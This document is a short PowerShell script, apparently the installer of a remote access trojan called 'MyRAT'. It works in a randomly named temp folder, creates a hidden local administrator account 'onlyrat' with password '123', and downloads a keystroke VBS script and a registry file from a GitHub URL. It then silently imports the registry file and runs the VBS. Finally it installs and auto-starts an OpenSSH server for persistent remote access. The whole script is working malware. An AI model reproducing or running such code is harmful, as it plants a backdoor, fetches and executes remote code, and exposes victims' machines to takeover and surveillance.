function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | %{[char]$_})
}
# Attempt to disable Windows Defender
$tmp = $env:temp
cd $tmp
$new_folder = random_text
mkdir $new_folder
cd $new_folder

function Create_User {
    [CmdletBinding()]
    param (
        [string] $uname,
        [securestring] $passwd
    )    
    begin {
    }    
    process {
        New-LocalUser "$uname" -Password $passwd -FullName "$uname" -Description "Temporary local admin"
        Write-Verbose "$uname local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
        Write-Verbose "$uname added to the local administrator group"
    }    
    end {
    }
}

$uname = "onlyrat"
$passwd = "123"
Remove-LocalUser -Name $uname
$passSec = (ConvertTo-SecureString $passwd -AsPlainText -Force)
Create_User -uname $uname -passwd $passwd
$vbs_script = random_text
$reg = random_text
Invoke-WebRequest -Uri https://raw.githubusercontent.com/bruning-frighting/MyRAT/refs/heads/main/keystroke.vbs -OutFile "$vbs_script.vbs"
Invoke-WebRequest -Uri https://raw.githubusercontent.com/bruning-frighting/MyRAT/refs/heads/main/reghidden.reg -OutFile "$reg.reg" 
Start-Process -FilePath "regedit.exe" -ArgumentList "/s `"$reg.reg`"" -NoNewWindow -Wait
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbs_script.vbs`"" -NoNewWindow -Wait
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
